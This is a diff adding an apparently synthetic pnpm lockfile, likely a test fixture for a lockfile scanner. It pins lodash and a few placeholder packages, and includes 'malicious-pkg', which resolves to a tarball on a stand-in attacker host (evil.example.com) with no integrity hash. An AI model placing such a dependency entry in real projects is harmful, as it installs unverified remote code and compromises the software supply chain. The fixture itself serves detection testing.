@@ -1,0 +1,59 @@
+lockfileVersion: '9.0'
+
+settings:
+  autoInstallPeers: true
+  excludeLinksFromLockfile: false
+
+importers:
+
+  .:
+    dependencies:
+      lodash:
+        specifier: ^4.17.21
+        version: 4.17.21
+      '@scope/pkg':
+        specifier: ^1.0.0
+        version: 1.0.0
+
+  packages/app:
+    dependencies:
+      malicious-pkg:
+        specifier: ^1.0.0
+        version: 1.0.0
+      '@scope/withpeer':
+        specifier: ^2.0.0
+        version: 2.0.0(peer@1.0.0)
+
+packages:
+
+  lodash@4.17.21:
+    resolution: {integrity: sha512-v2kDEe57lecTulaDIuNTPy3Ry4/GNQBALk5xz1CtLwjmpfKUZ0BX57iZfIuA1G+VuHrf1qJUkG5ycOHkQaqQdA==}
+    engines: {node: '>=4'}
+
+  '@scope/pkg@1.0.0':
+    resolution: {integrity: sha512-mZ1DfX2fL0faATnagmWPqcGuwh/T99YnOOsqIHU87E5xxD2ZJthH+D3ZoZ5663vOl7p434424ZPqLyBnihgSRy==}
+
+  malicious-pkg@1.0.0:
+    resolution: {tarball: https://evil.example.com/x.tgz}
+
+  '@scope/withpeer@2.0.0(peer@1.0.0)':
+    resolution: {integrity: sha512-abcDefX2fL0faATnagmWPqcGuwh/T99YnOOsqIHU87E5xxD2ZJthH+D3ZoZ5663vOl7p434424ZPqLyBnihg==}
+    peerDependencies:
+      peer: ^1.0.0
+
+  host-pkg@3.0.0:
+    resolution: {integrity: sha512-nA2EgY3gM1gbBUobnhXQrdHvxi/U00ZoPPtrJIV98F6yyE3aKuiI+E4apa6774wPm545535aQrMzCojhTSz==}
+
+snapshots:
+
+  lodash@4.17.21: {}
+
+  '@scope/pkg@1.0.0': {}
+
+  malicious-pkg@1.0.0: {}
+
+  '@scope/withpeer@2.0.0(peer@1.0.0)':
+    dependencies:
+      peer: 1.0.0
+
+  host-pkg@3.0.0: {}
